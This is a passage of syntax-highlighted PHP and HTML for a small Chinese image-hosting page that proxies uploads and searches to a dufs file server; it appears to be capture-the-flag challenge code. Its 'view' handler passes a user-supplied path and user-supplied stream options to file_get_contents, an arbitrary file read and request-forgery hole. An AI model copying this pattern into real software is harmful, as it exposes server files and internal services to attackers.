class="hljs-variable">$file_content</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Origin: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Referer: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: en,zh-CN;q=0.9,zh;q=0.8&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$file_content</span>)<br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;图片上传成功&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;图片上传失败，请稍后再试&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;未选择图片&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;search&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$search_query</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$search_query</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;只允许输入数字和字母&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$search_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/?q=&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$search_query</span>) . <span class="hljs-string">&#x27;&amp;json&#x27;</span>;<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$search_url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span><br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-variable">$response_data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$response</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$image_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>                <br>                <span class="hljs-variable">$filtered_paths</span> = [];<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;<br>                    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>                    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION));<br>                    <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$image_extensions</span>) || (<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;path_type&#x27;</span>] === <span class="hljs-string">&#x27;Directory&#x27;</span>)) &#123;<br>                        <span class="hljs-variable">$filtered_paths</span>[] = <span class="hljs-variable">$item</span>;<br>                    &#125;<br>                &#125;<br>                <br>                <span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] = <span class="hljs-variable">$filtered_paths</span>;<br>                <br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response_data</span>)]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-variable">$response</span>]);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;搜索失败，请稍后再试&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;请输入搜索关键词&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;view&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_content</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$base64_image</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_content</span>);<br>            <span class="hljs-variable">$mime_type</span> = <span class="hljs-string">&#x27;image/jpeg&#x27;</span>;<br>            <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>                <span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <br>                <span class="hljs-string">&#x27;is_image&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;base64_data&#x27;</span> =&gt; <span class="hljs-string">&#x27;data:&#x27;</span> . <span class="hljs-variable">$mime_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$base64_image</span><br>            ]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;无法获取图片&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;请输入图片路径&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;迷你图片空间&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: Arial, sans-serif;<br>            max-width: <span class="hljs-number">800</span>px;<br>            margin: <span class="hljs-number">0</span> auto;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>        &#125;<br>        .section &#123;<br>            margin-bottom: <span class="hljs-number">30</span>px;<br>            padding: <span class="hljs-number">15</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            background-color: white;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>        &#125;<br>        h2 &#123;<br>            margin-top: <span class="hljs-number">0</span>;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        .form-group &#123;<br>            margin-bottom: <span class="hljs-number">15</span>px;<br>        &#125;<br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">5</span>px;<br>            font-weight: bold;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        input[type=<span class="hljs-string">&quot;text&quot;</span>], input[type=<span class="hljs-string">&quot;file&quot;</span>] &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">8</span>px;<br>            box-sizing: border-box;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>        &#125;<br>        button &#123;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">15</span>px;<br>            background-color: <span class="hljs-comment">#4682b4;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            cursor: pointer;<br>        &#125;<br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#5f9ea0;</span><br>        &#125;<br>        .result &#123;<br>            margin-top: <span class="hljs-number">15</span>px;<br>            padding: <span class="hljs-number">10</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>            display: none;<br>        &#125;<br>        pre &#123;<br>            white-space: pre-wrap;<br>            word-wrap: <span class="hljs-keyword">break</span>-word;<br>            background-color: <span class="hljs-comment">#f5f5f5;</span><br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            max-height: <span class="hljs-number">300</span>px;<br>            overflow-y: auto;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;迷你图片空间&lt;/h1&gt;<br>    <br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;上传图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadForm</span>&quot; <span class="hljs-title">enctype</span>=&quot;<span class="hljs-title">multipart</span>/<span class="hljs-title">form</span>-<span class="hljs-title">data</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">upload</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">file</span>&quot;&gt;选择图片：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">required</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">small</span>&gt;支持所有类型的图片&lt;/<span class="hljs-title">small</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;上传图片&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;搜索图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">search</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">query</span>&quot;&gt;搜索关键词：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">required</span> </span><br><span class="hljs-class">                       <span class="hljs-title">pattern</span>=&quot;[<span class="hljs-title">a</span>-<span class="hljs-title">zA</span>-<span class="hljs-title">Z0</span>-9]+&quot; </span><br><span class="hljs-class">                       <span class="hljs-title">title</span>=&quot;只允许输入数字和字母&quot;</span><br><span class="hljs-class">                       <span class="hljs-title">placeholder</span>=&quot;输入图片关键词（仅限数字和字母）&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;搜索&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;搜索结果：&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResultContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;查看图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">view</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">filename</span>&quot;&gt;图片路径：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">required</span> <span class="hljs-title">placeholder</span>=&quot;输入图片路径&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;查看图片&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;图片预览：&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">        <span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">uploadForm</span>&#x27;).<span class="hljs-title">addEventListener</span>(&#x27;<span class="hljs-title">submit</span>&#x27;, <span class="hljs-title">function</span>(<span class="hljs-title">e</span>) </span>&#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = data.message;<br>                resultDiv.style.color = data.success ? <span class="hljs-string">&#x27;green&#x27;</span> : <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = <span class="hljs-string">&#x27;上传过程中发生错误&#x27;</span>;<br>                resultDiv.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> searchQuery = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;query&#x27;</span>).value;<br>            <br>            <span class="hljs-keyword">var</span> alphanumericRegex = /^[a-zA-Z0-<span class="hljs-number">9</span>]+$/;<br>            <span class="hljs-keyword">if</span> (!alphanumericRegex.<span class="hljs-title function_ invoke__">test</span>(searchQuery)) &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p style=&quot;color: red;&quot;&gt;只允许输入数字和字母&lt;/p&gt;&#x27;</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">var</span> jsonData = JSON.<span class="hljs-title function_ invoke__">parse</span>(data.result);<br>                        <br>                        <span class="hljs-keyword">if</span> (jsonData.paths &amp;&amp; jsonData.paths.length &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">var</span> resultHtml = <span class="hljs-string">&#x27;&lt;table style=&quot;width:100%; border-collapse: collapse;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr style=&quot;background-color: #f2f2f2;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;名称&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid 